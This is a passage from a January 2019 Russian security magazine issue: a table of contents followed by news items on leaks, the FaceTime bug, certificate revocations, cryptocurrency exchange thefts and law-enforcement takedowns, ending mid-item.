
                                                   Январь 2019
            № 238
CONTENTS

    MEGANews
  Самые важные события в мире инфосека за январь

    Дайджест Android
  Лучшие гайды, биб лиотеки и инструменты месяца

    Забытые андроиды
  Самые опасные уязвимости в старых вер сиях Android

   Фокус с Draw Over
  Раскрываем новую уязвимость в Android 6 и дела ем неуда ляемое приложе ние

    По следам Mirai
  Разбираемся, как трояны поража ют IoT, на примере самого злого из них

     Unicorn Engine
  Анализируем нативные библиотеки в приложениях для Android

    Вредонос на JS
  Как Chrome помог мне реверсить вирус‐шифровальщик

    Фун дамен тальные основы хакерства
  Продолжаем осваивать отладчик

    Злая картинка
  Разбираем уяз вимость в GhostScript, что бы эксплуатировать Pillow и ImageMagick

    Как Apple и Google защища ют «здоровье» пользователей
  Извле каем и сравнива ем данные Apple Health и Google Fit

    Злая утка с дис танционным управлением
  Собираем и прог рамми руем BadUSB с Wi‐Fi

    Я покажу вам Z‐Way
  Делаем хаб для умного дома на основе Z‐Wave и Raspberry Pi

    Ваяем сниффер на ESP32
  Слу шаем вайфай, при целиваемся на блютус!

    Python по всем правилам
  Делаем свою структуру дан ных совместимой с фичами Python

    Убить Билла
  Изучаем способы при нудительного завер шения процессов в Windows

   Мифы об аде
  Как и зачем программировать на аде в современном мире

    Протокол своими руками
  Создаем с нуля TCP‐про токол и пишем сервер на C#

    Corosync + Pacemaker
  Как правильно развернуть клас тер высокой отказоустой чивости

    Головоломка для робота
  Как я сделал машину для сбор ки кубика Рубика

     Титры
  Кто дела ет этот журнал

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





РАСШИРЕНИЯ ПОД
УГРОЗОЙ
Разработчики расширений для Chrome обеспокоены дей ствиями инженеров
Google.
  Возможности и ограничения для браузерных расширений определяются
манифестом, который сей час представ лен в виде версии 2. Но в настоящее
время в Google идет работа над третьей версией докумен та, и предлагаемые
изменения вызывают тревогу и сомнения в сообществе.
  Дело в том, что в Google планируют огра ничить работу webRequest API, что
может оказаться критически важно для функционирования блокиров щиков
контента. Вмес то webRequest разработчикам будет пред ложено исполь‐
зовать declarativeNetRequest. Разумеется, в Google считают, что эти улуч‐
шения повысят безопасность и производительность.
  К счастью, инженеры Google сами инициировали публичное обсуждение
текущей редакции манифеста, перед тем как окончательно принять его
и внести важ ные изменения в Chromium, который лежит в сердце браузе ров
Chrome, Vivaldi, Opera, Brave и про чих. И критика не заставила себя ждать.
  Первым свою точку зрения высказал разработчик популярных блокиров‐
щиков контента uBlock Origin и uMatrix Реймонд Хилл (Raymond Hill). Он пре‐
дупредил, что отказ от webRequest ста нет «смертью» для его продуктов, а так‐
же выразил опасение, что переход на API declarativeNetRequest может пагуб‐
но сказать ся на множестве других продук тов.
  К настоящему моменту точку зрения Хил ла раз деля ют все больше раз‐
работчиков и ИБ‐спе циалистов, которые единогласно уверяют Google, что
манифест нужно менять, а отказ от webRequest не при несет ничего хорошего.
Так, о потенциальных проблемах, которые вызовет при нудительный переход
на declarativeNetRequest, уже заявили:
 • разработчик известнейшего аддона NoScript для Firefox. Он подчеркнул,
   что из‐за нового API вообще не сможет закончить NoScript для Chrome,
   над которым работает уже давно;
 • инженер компании F‐Secure, который отметил, что новые ограничения
   могут  ска зать ся на работе многих защитных решений и продуктов
   родительского  контроля.  Таким решениям  необходимо  иметь  воз‐
   можность динамически бло кировать HTTPS‐трафик, который может быть
   опасен для пользователей, но, если примут новую версию манифеста,
   это едва ли будет возможно;
 • специалиста F‐Secure поддержал эксперт компании Amnesty International,
   который тоже счи тает, что под угрозой окажется функциональность почти
   всех защит ных расширений для Chrome;
 • автор расширения Blockade.io, направленного на защиту от drive‐by‐атак
   и посещения фишинговых сайтов, тоже пишет, что его продукт практичес‐
   ки перес танет работать, если манифест оставят без изменений;
 • создатель известного расширения Tampermonkey объяснил, что его про‐
   дукт не сможет загружать удаленные скрипты, а это краеугольная часть его
  функциональности;
 • с критикой сог лаша ется и команда Ermes Cyber Security, разрабаты‐
  вающая продукты для защиты от фишинговых атак, в том числе и соответс‐
   твующее расширение для Chrome.

Остается наде ять ся, что инженеры Google прислуша ются к критике и учтут
полученные замечания. Напомню, что прошлой осенью под шквалом кри тики
со сто роны сообщества и специалис тов разработчики Chrome уже отказыва‐
лись от внесенных в браузер изме нений. Тогда комьюнити, например, не пон‐
равилось сокрытие WWW и поддоменов из адресной строки (и баги, связан‐
ные с этой новой функциональ ностью), а также принудительная авто ризация
в браузере, которую мно гие эксперты сочли навязчивой и вводящей в заб‐
луждение.


773 000 000 EMAIL‐АДРЕ СОВ И 21 000 000 ПАРОЛЕЙ

В сети нашли дамп объ емом 87 Гбайт. Он назывался Collection #1 («Коллекция № 1») и содер‐
жал более 12 000 отдельных фай лов. В него вошла подборка email‐адресов и паролей, сум‐
марно насчитывающая 2 692 818 238 записей.

Создатель агрегатора утечек Have I Been Pwned (HIBP) Трой Хант (Troy Hunt) насчитал в сбор‐
нике 772 904 991 уни каль ный email‐адрес и еще 21 222 975 уникальных паролей.

Судя по всему, «Коллекция № 1» — это сборник старых утечек данных и новой информации там
не так уж мно го. Хант обна ружил, что лишь 141 000 000 (около 18%) email‐адре сов не фигури‐
ровали на HIBP ранее и не были частью других известных брешей. Половина от 21 000 000
уникальных паролей тоже уже давно числилась как «утекшие».





APPLE VS FACEBOOK
VS GOOGLE
Серьезный конфликт произошел в этом месяце между гигантами ИТ‐индус‐
трии. Компания Apple вре менно заблокировала enterprise‐сертификаты Face‐
book и Google.


Facebook
Очередной конфликт вокруг социаль ной сети возник на фоне пуб ликации ре‐
зультатов жур налистско го расследования TechCrunch.
  Специалисты издания обнаружили, что Facebook, нев зирая на установ‐
ленные Apple правила, рас пространяла сре ди пользовате лей приложе ние
Facebook Research, предназна ченное для сбора данных. Так, пользователям
предлагали принять учас тие в «оплачиваемом научном исследовании соци‐
альных медиа», и Facebook Research устанавливало на устройство собствен‐
ный  root‐сертификат,  пос ле  чего  могло  собирать  практичес ки любую
информа цию о гаджете и действиях его владельца. Справед ливости ради
нужно отме тить: о том, что приложение получит доступ к самым разным дан‐
ным, людей информировали.





За  такую  слежку  Facebook  предлагала  пользователям  iOS  и  Android
(от 13 до 35 лет) до 20 долларов в подарочных сертификатах в месяц, а также
различные бонусы за прив лечение друзей. Причем приложе ние распростра‐
нялось через бета‐тестерские сервисы Applause, BetaBound и uTest, чтобы
до последнего не упо минать о связи «исследования» с Facebook.
  Однако корень конфликта заключается не в том, что люди разрешали
Facebook следить за сво ими действиями за деньги, а в том, что приложение,
в наруше ние всех правил, было подписано enterprise‐сертифика том Face‐
book. Сог ласно правилам Apple, такие продукты могут иметь хождение только
внутри ком пании, но не предоставлять ся пользователям. Хуже того, приложе‐
ние могло обновлять ся в обход App Store, и в прошлом году Apple уже бло‐
кировала его «предыдущую итерацию», Onavo Protect, что тоже было связано
с немалым скандалом.
  В итоге, ког да информация о Facebook Research стала достоянием
общественности, Apple попросту отозвала enterprise‐сертификат Facebook,
а в ком пании подчеркнули, что такое наказание ждет любого раз работчика,
прямо наруша юще го пра вила Enterprise Developer Program:



     «Наша Enterprise Developer Program соз дана исклю чительно для внут-
      ренне го рас пространения приложе ний в пре делах организа ции. Face-
      book использовала свое членство в программе для рас простра нения
      при ложе ний, собира ющих информа цию о пользователях, что явля ется
      прямым наруше нием договорен ностей с Apple. Любой раз работ чик,
      использующий enterprise-сер тифика ты для рас простра нения при ложе-
      ний среди поль зователей, закончит тем, что его сертифика ты будут
      отоз ваны, что мы и сделали в дан ном случае, что бы защитить наших
      пользовате лей и их дан ные».

Из‐за отзыва сертификатов «сломались» приложения, которыми 33 000 сот‐
рудни ков соци альной сети, как и положено, пользовались внутри компании
(включая бета‐версии Facebook и Instagram, а также решения для управления
различной офис ной рутиной: Workplace, Work Chat, Mobile Home).
   Такого поворота событий в Facebook определенно не ожидали, однако
всего день спустя компании сумели прийти к соглашению: пред ставители
Facebook сообщили, что сер тификаты были восста новлены, а внутренние
приложения возобновили работу.
  Интересно, что в то же время в распоряжении издания Business Insider
оказался текст внутренней служебной записки, посвященной происхо дяще‐
му, которую руководство Facebook распространило среди сотрудников. Сог‐
ласно этому документу, руководство социаль ной сети по‐прежнему не приз‐
нает вины компании, хотя и под черкивает, что отношения с Apple очень важны
для Facebook. Документ гласит, что приложение Facebook Research вовсе
не нарушало установленных Apple правил, не распространялось в обход App
Store и, конечно, не «шпионило» ни за кем без разрешения.


Google
В аналогичной ситуации одновременно с Facebook оказалась и компания
Google.
  Дело в том, что на волне скандала вокруг действий социальной сети спе‐
циалисты обна ружили, что поисковый гигант имеет очень похожее приложе‐
ние Screenwise Meter, существующее с 2012 года. Оно точно так же исполь‐
зовалось для исследования поведения пользовате лей от 13 лет (до 18 лет
требовалось сог ласие родителей), а за участие в программе людей воз‐
награж дали подарочными сертификатами. И Screenwise Meter точно так же
был подписан enterprise‐сер тификатом Google.
  В Google спешно заявили, что немедленно отключат приложение на iOS‐
устройствах и выведут из прог раммы Enterprise Developer, так как, оказыва‐
ется, оно использовало корпоратив ный сертификат по ошибке.
   Но, заб локиро вав сертификаты Facebook, в Apple решили не оста нав‐
ливаться на достигнутом и наказать Google тоже. После чего кор поративные
сертификаты Google так же были отозваны. Как и в случае с соци альной
сетью, решение Apple негативно сказалось на работе внутренних приложе‐
ний компании: отка зали Google Maps, Hangouts, Gmail, а также бета‐вер сии
множества других продуктов и при ложе ния для сотрудников.
  На разрешение кон флик та с Apple представителям Google понадо билось
даже мень ше суток. Через несколько часов после блокировки пред ставители
компании сооб щили СМИ, что работа сертифика тов была восстановлена,
а инже неры Apple уже помогают Google вернуть внут ренние при ложения
в строй.
  Судя по все му, пока шумиха вокруг поднятой темы не утихла, можно ожи‐
дать появ ления новых сообщений о похожих нарушениях. Так, специалисты
в социальных сетях уже пишут о приложениях дру гих крупных компаний,
которые точно так же действуют в обход App Store и используют корпоратив‐
ные сертификаты.





РОССИЯНЕ НЕ ПОНИМАЮТ, КАК РАБОТА ЕТ БИТКОЙН
Исследование «Лабора тории Касперского» показало, что более трети россиян (37%) знают, что
такое крип товалюта, но совершенно не понимают, как она работа ет. Еще 42% опрошенных
заявили, что не используют крип товалюты сей час и не планиру ют в ближайшем будущем.





→«Насторожен ность пользователей в отно шении крип товалют впол не объяснима: для многих
это что‐то новое, нестабильное, нефизичес кое. А вот ресурсы и день ги, связанные со всей
этой сферой, очень даже реальные. Как и рис ки. Нап ример, 2% опро шен ных нами пользовате‐
лей теряли крип товалю ту из‐за атак вре доносного ПО»
— Алексей Маланов, антивирусный эксперт «Лаборатории Кас перского»





БАГ В FACETIME
В FaceTime нашли опасный баг. Проблема поз воляла звонящему получить
доступ к чужим микрофону и камере, даже если на звонок вооб ще не отве‐
тили.
   Эксплуатация уязвимости не требовала каких‐то специальных навыков
и глубоких познаний. По сути, было достаточно добавить самого себя к груп‐
повому звонку, и мож но слушать, что происходит воз ле устройств других
пользователей, даже если те вообще не подняли трубку.
   Из‐за этой проб лемы разработчики Apple были вынуждены экстренно
увести в офлайн Group FaceTime, чтобы защитить пользовате лей от массовой
эксплуатации бага.
   Как выяснилось позже, первым проб лему обнаружил 14‐летний подросток
из Аризоны Грант Томпсон (Grant Thompson), и это произошло задолго
до того, как информация о проблеме стала известна широким массам,
19 января 2019 года. Подросток играл в Fortnite и координировал свои дей‐
ствия с друзьями через груп повой звонок FaceTime, когда случайно добавил
сам себя к разговору и обнаружил баг.
  Мать Гран та, Мишель Томпсон (Michele Thompson), попыталась уведомить
разработчиков Apple об опас ной ошибке всеми возможными способа ми.
У себя в Twitter женщина писала, что уже направила компании баг‐репорт,
вкратце описывала саму проблему и утверждала, что у них с сыном есть
видео, демонстрирующее эксплуата цию ошибки в деле. Кроме того, Мишель
послала аналогичное сооб щение в Facebook, написала письмо в Apple,
отправила факс и позвонила в под держку компании.
  К сожалению, на обращение Томпсон не обратил внимания практичес ки
никто, а в Apple попросту проигнорировали все ее попыт ки уведомить о баге.
В поддержке женщине и вовсе предложили войти под аккаунтом разработ‐
чика и заполнить баг‐репорт по всем правилам. Одним из нем ногих, кто
заметил сообщения женщины, был ИТ‐пред приниматель Джон Мейер (John
Meyer), который связался с Томпсонами и позже опубликовал у себя в Twitter
все отправленные ими сообщения и документы, под черкивая, что Мишель
и ее сын сделали все, что мог ли, и сделали это правильно.





Увы, раз работ чики Apple отреагировали на проблему лишь тогда, когда
информа ция о баге распространилась по социальным сетям со скоростью
лесного пожара (очень иронично, но это произошло в понедельник, 28 янва‐
ря, в меж дународный день защиты персональных данных).
  Конечно, стоит учитывать, что представители Apple получают множество
уведомлений о багах каждый день, в том числе «мусорных», неверных
и заведомо фаль шивых. Но теперь, ког да СМИ стало известно об отчаянных
многодневных попыт ках Томпсон связать ся с Apple, многие специалисты схо‐
дятся во мнении, что ИТ‐ком пани ям все же стоит быть внимательными
не только к сообщениям экспертов, а слушать и простых пользователей
и предоставить пос ледним работающие и более оче видные каналы связи
с разработ чиками.


WANNACRY ЖИВ
Прошло уже пол тора года после мас совых атак шиф ровальщика WannaCry, взбудораживших
без пре уве личения весь мир. Эксперты ком пании Kryptos Logic по‐преж нему под держивают
работу «аварийного рубильника», сов мес тно со специалис тами ком пании Cloudﬂare, защища‐
ющими этот домен от DDoS‐атак. И, как показывают наб людения, WannaCry все еще подает
признаки жиз ни.

Домен, играющий роль «стоп‐кра на» для малвари, до сих пор прив лека ет около 17 000 000
запросов в неделю.





Эти обра щения исхо дят с 630 000 уникальных IP‐адре сов, относящих ся к 194 стра нам мира.
Боль ше всего машин, зараженных WannaCry, находится в Китае, Индонезии и Вьетнаме.
Россия занима ет 5‐е место в списке.





                                     Продолжение статьи →
← Начало статьи





 КРИПТОВАЛЮТЫ
 ПОД АТАКОЙ
  2019 год начался сразу с нескольких круп ных атак на различные криптовалю‐
  ты и извес тные биржи. Ущерб от дей ствий преступников исчисляется мил‐
  лионами долларов.


  Ethereum Classic
  В начале января разработчики крупной крип товалютной биржи Coinbase
  опубликовали в офи циальном блоге ком пании пост, в котором рассказали
  об атаках на блокчейн крип товалюты Ethereum Classic (ETC).
    Подозрительная активность, которую специалисты характеризуют как «глу‐
  бокую реор ганизацию  блокчейна  Ethereum  Classic»,  началась 5  янва‐
  ря 2019 года и продолжалась еще много дней. По данным на 7 янва‐
  ря 2019 года, неизвестные атакующие осуществили пятнадцать реорганиза‐
  ций и атак двойной траты, суммарно «зарабо тав» на этом 219 500 ETC (око‐
  ло 1,1 мил лиона долларов США).
    В блоге исследователи под робно рассказали о так называемых атаках
  двойной траты (double spend). Как несложно догадаться по названию, данный
   вектор атак подразуме вает, что преступник может несколько раз потратить
  одни и те же средства.
     Вскоре информа цию специалистов Coinbase подтвердили их кол леги
  из Bitﬂy, а также сами разработчики Ethereum Classic, которые сначала всё
  отрицали. Фактически на криптовалю ту была устроена атака 51%, а затем
  преступники выпол нили двойные траты.





  После обнаружения третьей реорганизации блок чейна ETC коман да Coinbase
  заморозила операции с этим токеном на своей площадке. На такой же шаг
  пошли и разработчики биржи Kraken. Кро ме того, о намере нии компенси‐
  ровать убыт ки сво им пользователям заявили представители обменни ка
   Gate.io.
     Теперь специалис ты и сообщество критикуют как разработ чиков ETC,
  не заметив ших подозрительную активность в собс твенной сети, так и пред‐
   ставителей Coinbase, которые мол чали о происходящем три дня, тем самым
  подвергая поль зовате лей дополнительному рис ку.


  Баги в PoS-крип товалютах
  Эксперты из Илли ной ско го университета в Эрбане — Шам пейне расска зали
  об атаке Fake Stake, которая представляет угрозу для 26 proof‐of‐stake
   (доказательство доли владения, PoS) криптовалют. Исследователи пишут, что
  обнаружи ли две уязвимости, делающие эту ата ку возможной.
    Обнаружен ные баги позволяют сетевому атакующему с очень малой
  долей владения вызвать отказ в работе любого сетевого узла с определен‐
  ным ПО. Такая проблема может быть крайне опас на, потому что атакующий
  сможет попросту избавиться от неугодных ему конкуриру ющих узлов и совер‐
  шить атаку 51% на блокчейн целевого токена.
     Авторы Fake Stake отмечают, что многие криптовалюты — это форки
  и «потомки» Bitcoin, которые опи раются на ту же кодовую базу, добавив к ней
  PoS‐функциональность.  Причем  многие  идеи  раз работ чики  копируют,
  забывая о безопасности, что приводит к возникно вению новых уязвимос тей,
  которых не было в «родительской» кодовой базе.
    В корне проблемы Fake Stake лежит  тот факт, что имплементации
  PoSv3 не валидируют должным образом сетевые данные перед подключени‐
  ем к делу цен ных ресурсов (к примеру, RAM и жес ткого дис ка). В итоге ата‐
  кующий с сов сем небольшой долей вла дения (или вообще без таковой)
  может «забить» RAM и диск узла жертвы мусорными данными, спровоцировав
   отказ в работе.
     Эксперты обнаружи ли проблемы еще в августе 2018 года и с октября
  прошлого года информируют о них разработчиков уязвимых крип товалют.
  К сожалению, с некоторыми коман дами исследователям не удалось связать‐
  ся до сих пор. Дру гие уже выпус тили патчи и устранили уяз вимости. Нужно
  отметить, что все уязвимые криптовалю ты демонстрируют небольшую рыноч‐
  ную капита лизацию, из них самая «крупная» — Qtum, занимающая лишь 30‐ю
  позицию на CoinMarketCap.
    Список уязвимых перед Fake Stake криптовалют можно увидеть ниже. Так‐
  же PoC‐код, демонстрирующий Fake Stake в действии, уже доступен на GitHub
  на тот слу чай, если разработчики других PoS‐криптовалют решат протес‐
   тировать свой код на пред мет уяз вимостей.





  LocalBitcoins
  Операторы платформы  LocalBitcoins, которая представ ляет собой P2P‐
  обменник и позволяет пользователям покупать крип товалюту друг у друга,
  сообщили об ата ке на проект. Инцидент произошел 26 янва ря 2019 года
  и длился как минимум пять часов.
     Пользователи обменника сообщали, что при попытке посетить официаль‐
  ный форум LocalBitcoins их ждал редирект на страницу, имитировавшую стра‐
  ницу авто ризации LocalBitcoins. Если пользователь не замечал подвоха и вво‐
  дил свои учетные данные на фишинговой странице, те попадали в руки неиз‐
  вестных злоумышленни ков, которые так же не забывали зап рашивать у жертв
  коды двух фактор ной аутентификации, если она была включена.
    В итоге адми нис тра ция обменника была вынуждена вре менно приоста‐
  новить работу форума, а затем и осу ществле ние тран закций. В отчете, опуб‐
  ликованном уже после расследования инцидента, разработчики платформы
  сообщили, что проблема зак лючалась в одной из функций неназванно го сто‐
  роннего ПО. В ито ге форум по‐прежнему отключен из соображений безопас‐
   ности, а коман да LocalBitcoins все еще пытается оценить ущерб, нанесенный
  пользователям.
    Сами пользователи платформы проследили украденную криптовалю ту
  до Bitcoin‐кошелька преступни ков, куда поступило 7,95205862 биткойна (око‐
  ло 28 200 дол ларов по курсу на момент инцидента).


  Cryptopia
  В середине января 2019 года популярная новозеландская криптовалютная
  биржа Cryptopia сообщила, что понесла «значительные убытки» в результате
  кибератаки.
    Об инциденте до сих пор не известно практичес ки ничего кон кретного:
  представители биржи не сообщают ни точный раз мер ущерба, причиненного
  торговой площадке и ее поль зователям, ни от какой именно атаки пос тра‐
  дала платформа. Согласно последним обновлениям в официальном Twitter
  проекта, в настоящее время рас следованием слу чившегося занимаются пра‐
  воохранительные  орга ны, поэтому администрация  Cryptopia  «отрезана»
   от собственных систем и не имеет доступа к бирже (которая, разумеется,
  по‐прежнему не работает).
     Тем временем весьма интересные данные публику ют аналитики компании
   Elementus. Ранее они уже проследили движение средств и подсчитали, что
  суммарный ущерб от ата ки может составлять около 16 миллионов долларов
   в различных токенах.





  А в конце месяца экспер ты Elementus и вовсе сообщили, что злоумышленники
  продолжают грабить пострадавшую биржу, так как они, в отличие от админис‐
   траторов платформы, не утратили доступ к кошель кам.
    По данным исследователей, 28 января 2019 года неизвестные опус‐
  тошили еще около 17  тысяч кошель ков,  похитив 1675 ETH  (пример‐
  но 180 тысяч долларов по текущему курсу).
     Хуже того, похоже, далеко не все пользователи Cryptopia знают об атаке
  на биржу, так как, сог ласно Elementus, тысячи человек по‐прежнему про дол‐
  жают пополнять свои счета (большинство средств поступает от май нин говых
   пулов, то есть майнеры не потрудились сменить адреса, на которые перечис‐
  ляются токены).
     Например,   в   резуль тате   нового   хищения   средств   постра‐
  дали 5000 кошельков, которые уже были опус тошены две недели назад, одна‐
   ко пользователи снова пополнили их, и хакеры ограбили их второй раз.


 МИЛЛИОН ДОЛ ЛАРОВ ЗА ЭКС ПЛОИТЫ

   Компания Zerodium объ яви ла о существенном повыше нии цен на экс плоиты. Если ранее
   за устойчивый удаленный джей лбрейк для iOS предлагали 1 500 000 долларов США, то теперь
   размер вып латы увеличился до 2 000 000.

   Обязатель ное условие для такого джей лбрейка — отсутствие какого‐либо вза имодействия
   с пользовате лем, то есть все должно про исхо дить автоматичес ки. Если же минимальное вза‐
   имодействие с пользовате лем все же требует ся, такой экс плоит будет оценен в 1 500 000
   долларов США.


   Вдвое увеличились вып латы за RCE‐уяз вимос ти нулевого дня и эксплоиты для них в мессен‐
   джерах WhatsApp и iMessage, а так же при ложениях для работы с SMS/MMS на раз ных плат‐
   формах. Ранее на эксплуата ции таких багов можно было заработать до 500 000 долларов
  США, а теперь до 1 000 000 дол ларов.

   Интересно, что при этом 0day‐уязвимос ти в Signal, Telegram и Facebook Messenger по‐преж‐
   нему стоят 500 000 дол ларов США.





 СКРИПТЫ GODADDY
  Веб‐раз работ чик Игорь Кромин (Igor Kromin) привлек внимание СМИ и поль‐
  зователей к инте рес ной проб леме.
     Все началось с того, что спе циалист попытался найти причину ошибки,
  связанной с невозможностью загрузки некоего файла JavaScript (как выяс‐
  нилось потом, проблему Кромин искал не там, где следовало, и корень бага
  вообще скрывался в Safari). В результате он обнаружил на своем сайте нез‐
  накомый JavaScript и букваль но не поверил своим гла зам, когда про читал
  комментарий, гласивший, что скрипт внедрен в код не какими‐то злоумыш‐
  ленниками, но одним из крупнейших в мире регистраторов и хостеров — ком‐
  панией GoDaddy.





         «Конечно, ком мента рий к скрип ту полностью объяснял, что про исхо-
          дит, но сна чала я прос то не хотел верить, что сам хос тер внед рил
         скрипт JavaScript в мой сайт без моего согласия! Но оказалось, что
        GoDaddy сде лал именно это, и они оправды вают [свои дей ствия] сбо-
        ром мет рик и улучшени ем про изводитель нос ти», — пишет Кро мин.

  Как выяснилось, внед рение скриптов в код сайтов клиентов — это часть сис‐
  темы GoDaddy Real User Metrics (RUM), предназначение которой ком пания
  описывает так: «поз воля ет находить внутренние „узкие места“ и возможности
  для оптимизации путем внед рения небольшого сниппета JavaScript на поль‐
  зовательские сайты».
    По  сути,  скрипт  отслеживает  производительность  сайта,  собирает
  информа цию о скорос ти загрузки страниц и времени установ ления соеди‐
   нения, а затем эта статистика использует ся для оптимизации систем GoDad‐
   dy, роутин га, конфигурации серверов и так далее. Ирония ситуации заключа‐
   ется в том, что разработчики признают: сам скрипт может негатив но влиять
  на произво дительность сай тов и вызывать проблемы в их работе.
     После того как Кромин привлек внимание сообщества к проблеме, ока‐
   залось, что сбор статистики включен по умолчанию, но от него все же можно
   отказаться, если зай ти в настройки cPanel Shared Hosting или cPanel Business
   Hosting и отклю чить там функци ональ ность Help Us.
    Недовольство комьюнити вынудило представителей GoDaddy выступить
  с официальным заявлением. Разработчики заверили, что понима ют оза‐
  боченность пользователей, и сообщили, что немедленно прекратят внед рять
   JavaScript на сайты клиентов. Программу мониторинга пообе щали осно‐
   вательно перера ботать и возобновить позднее, но пре доставив сами поль‐
  зователям возможность решать, нужен ли им такой сбор статистических дан‐
   ных.


 РОСКОМНАДЗОР СНЯЛ БЛО КИРОВ КУ С AMAZON
   Роскомнадзор снял бло киров ку с 2,7 миллиона IP‐адре сов компании Amazon, так как ими
   для уклонения от бло киро вок больше не поль зуется мессенджер Telegram. Однако специалис ты
   отмечают, что Роскомнадзор, похоже, просто изме нил тактику и не собирается прекращать
   попытки бло киро вать мессенджер.





  →«Судя по всему, они уве личи ли ботнет‐ферму, сканящую популяр ные хостинговые сервисы,
   уве личили фер му „клиентов“ Telegram, установили у ряда провайдеров в опытную экс плу ата цию
   оборудование, выделя ющее характерный трафик прокси‐серверов, развернули программы
   анализа соц сетей, умень шили время реак ции на нахождение новых IP‐адресов с нескольких
   дней до примерно часа. Это, конечно же, не очень хорошо сказывается на работе Telegram»
  — Филипп Кулин, создатель сер виса Usher2.Club, отслежива ющего выг рузки РКН





 ЯПОНСКИЕ ВЛАСТИ
 «ЛОМАЮТ» IOT
  Японское правительство одобрило поправки в законодательство, которые
  позволят госслужащим вторгать ся на пользовательские устройства интерне‐
   та вещей в рамках масштабной «переписи» IoT‐девай сов.
    На такие меры власти решили пойти в преддверие летних Олим пийских
   игр 2020 года, которые пройдут в столице страны Токио. Во время Олим‐
  пиады   власти   страны   опасаются   «правительственных»   кибера так
  на инфраструктуру игр, подобных Olympic Destroyer. Напомню, что вредонос
   атаковал зимние Олим пийские игры в Пхёнчане, и во время церемонии
  на стадионе отключился Wi‐Fi и телевизионные системы, а так же переставал
  функционировать офи циальный сайт Олимпиады.
     Чтобы подготовиться к подоб ному и заранее принять защитные меры,
  власти решили дать сотрудникам Наци онального института информацион‐
  но‐коммуника ционных  технологий  (NICT)  полномочия  искать  уязвимые
  устройства интернета вещей в стране (под патронажем министерства внут‐
  ренних дел и коммуникаций). Госслужащие получат право перебирать дефол‐
  тные пароли и исполь зовать так называемые словарные атаки для выявления
  незащи щенных гаджетов.
    По ито гам этого исследования будет составлен перечень  уязвимых
  устройств, использующих учетные дан ные по умолчанию или слиш ком прос‐
  тые пароли. Затем эта информация будет передана влас тям, они, в свою оче‐
   редь, передадут дан ные интернет‐провайдерам, чтобы те могли свя заться
  с  владельцами  устройств,  уведомить  их о проблемах и обезопасить
  «дырявые» гаджеты.
    Поиск уяз вимых устройств должен стартовать уже в следующем месяце,
  и в общей сложности власти планируют проверить около 200 мил лионов
  девайсов, начиная с роутеров и веб‐камер.


  УСТАРЕВШЕЕ ПО

   Эксперты Avast опубликовали инте рес ную статистику, собранную на 163 000 000 устрой ств
   пользовате лей Avast и AVG (разумеется, в обез личен ном виде). Спе циалисты пришли к выводу,
   что в подавляющем большинс тве пользовате ли Windows имеют на своих машинах устарев шее
   ПО, дав но не получавшее обновле ний, что под вергает их системы рис ку.

   Чаще все го пользователи забыва ют или не хотят обновлять Adobe Shockwave, VLC Media
   Player и Skype, которые занимают первые 3 мес та в списке уста рев ших программ.

   За ними, с совсем небольшим отры вом, сле дуют уяз вимые версии Java Runtime Environ-
  ment вер сий 6–8, 7-Zip, а так же Foxit Reader.





  Еще одна проблема — устаревшие вер сии пакета Microsoft Office: 15% всех установок Of‐
   ﬁce при ходит ся на  Enterprise 2007. Под дер жка дан ной версии была прек ращена еще в
   2017 году, так что обновле ний безопасности она не получа ет уже почти 2 года.





   Windows 7 по‐преж нему лидирует и установлена на машинах 43% поль зователей, хотя доля
   Windows 10 и сос тавля ет внушительные 40%.

   Проблема в том, что око ло 15% поль зователей Windows 7 работа ют с RTM‐вер сиями, хотя те
   не поддерживаются с 2013 года и практичес ки не получа ют важных обновлений с тех самых
   пор. В свою оче редь, устаревшие версии Windows 10 можно найти на 9% машин.





                                        Продолжение статьи →
← Начало статьи





 XDEDIC ЗАКРЫЛИ
  Еще в июне 2016 года спе циалисты «Лаборатории Кас перского» рассказали
  о хакерской тор говой площадке xDedic, на которой злоумыш ленники про‐
  давали доступ  к взломанным серверам со все го мира. Тогда ресурс,
  работавший в обычном интернете, а не в зоне .onion, быстро исчез с радаров
   и, казалось, прекратил свою деятельность.
     Как выяснилось вско ре, xDedic про должил работу, но перебрался в дар‐
   кнет. Новый xDedic полностью копировал дизайн  старого сайта. Вес‐
  ной 2017 года эксперты Flashpoint сообщали, что ресурс не просто продол‐
  жал работать, но не испытывал никаких проб лем (на которые после ухода
   xDedic в даркнет так надеялись ИБ‐специалисты). По дан ным Flashpoint, если
  ранее на сайте продавали доступ более чем к 70 тысячам взломанных сер‐
  веров по всему миру, то в 2017 году ресурс предлагал своим посетителям
  уже более 85 тысяч взломанных сер веров.
    Но похоже, теперь xDedic все же пришел конец. Представите ли Евро пола
  и ФБР опубликовали пресс‐релизы, в которых рассказали о международной
  операции, в ходе которой 24 января был перехвачен контроль над обоими
  доменами торговой площадки, сам xDedic закрыт, а в распоряжении правоох‐
  ранителей ока зался список всех клиентов ресурса. В опе рации принима ли
   участие правоохранитель ные органы США, Бельгии, Гер мании, Украины,
  а также Европол, налого вое управление США и иммиграционная и таможен‐
  ная полиция США.
    По оценке следователей, за годы работы xDedic поспособс тво вал совер‐
  шению случаев мошенничества, общий ущерб от которых может дос‐
   тигать 68 миллионов долларов.
    Сообщается, что инфраструк тура ресурса, базировавшаяся в Бельгии
  и Украине, была «демон тирована». Эту информацию подтвер дили предста‐
   вители укра инской Кибер полиции, которые также сообщили о задержании
  и допросе трех подозреваемых.


  3 ПРАВООБЛАДАТЕЛЯ УДАЛЯЮТ КОНТЕНТ ИЗ GOOGLE

   Согласно опуб ликованному Google отче ту о проз рачности, из 160 000 правообладателей, зап‐
   рашивающих удаление контента из поис ковой выдачи, все го 3 ответственны за уда ление почти
    1 000 000 000 ссы лок.

   Хотя в последние два года число жалоб на нарушение DMCA сокращается, статистика по‐преж‐
   нему изрядно шокирует. Так, в 2018 году из поис ковой выдачи исключили более 700 000 000
   ссылок, тогда как в 2011 году, ког да компания Google только начала публиковать ста тис тику, их
   количес тво равнялось 160 000.

   Возглавляет спи сок наиболее активных дер жателей прав Британская ассоциация про изводите‐
   лей фонограмм (British Phonographic Industry, BPI): за прошед шие годы BPI пожало валась
   на 425 000 000 ссы лок, то есть ответственна более чем за 10% жалоб.

   Второе и третье места подели ли меж ду собой APDIF Mexico и APDIF  Brazil. На их сче ту
  252 000 000 и 247 000 000 запросов на удаление соответственно.





 ЕВРОПОЛ ИЩЕТ
 DDOS’ЕРОВ
  В апреле 2018 года Европол отчитался о ликвидации одного из крупнейших
   в мире сервисов для DDoS‐атак — Webstresser. Напомню, что этот ресурс
